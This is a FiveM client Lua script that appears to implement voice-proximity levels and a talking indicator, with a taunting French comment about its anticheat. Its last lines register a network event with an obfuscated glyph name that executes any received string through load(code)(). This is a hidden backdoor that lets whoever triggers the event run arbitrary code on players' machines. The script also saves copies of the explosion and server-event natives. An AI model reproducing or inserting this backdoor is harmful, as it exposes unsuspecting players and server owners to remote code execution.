-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local isUiOpen = false
local isTalking = false

local voiceChoice = {
	{level = 2.0, label = 'Chuchoter'},
	{level = 6.0, label = 'Normal'},
	{level = 12.0, label = 'Crier'}
}

local defaultChoice = 2
local currentVoice = defaultChoice

Citizen.CreateThread(function()
	NetworkSetTalkerProximity(voiceChoice[defaultChoice].level)

	while true do
		Citizen.Wait(0)

		if IsControlJustPressed(0, 170) then
			if currentVoice == #voiceChoice then
				currentVoice = 1
			else
				currentVoice = currentVoice + 1
			end

			NetworkSetTalkerProximity(voiceChoice[currentVoice].level)
		end

		if IsControlPressed(0, 170) then
			local plyPed = PlayerPedId()
			local headCoords = GetPedBoneCoords(plyPed, 12844, 0.0, 0.0, 0.0)
			DrawMarker(28, headCoords, vector3(0.0, 0.0, 0.0), vector3(0.0, 0.0, 0.0), vector3(voiceChoice[currentVoice].level, voiceChoice[currentVoice].level, voiceChoice[currentVoice].level), 255, 119, 0, 70, false, false, 2, false, false, false, false)
		end

		if not isTalking then
			if NetworkIsPlayerTalking(PlayerId()) then
				isTalking = true
				SendNUIMessage({displayWindow = 'true'})
				isUiOpen = true
			end
		else
			if not NetworkIsPlayerTalking(PlayerId()) then
				isTalking = false
				SendNUIMessage({displayWindow = 'false'})
				isUiOpen = true
			end
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)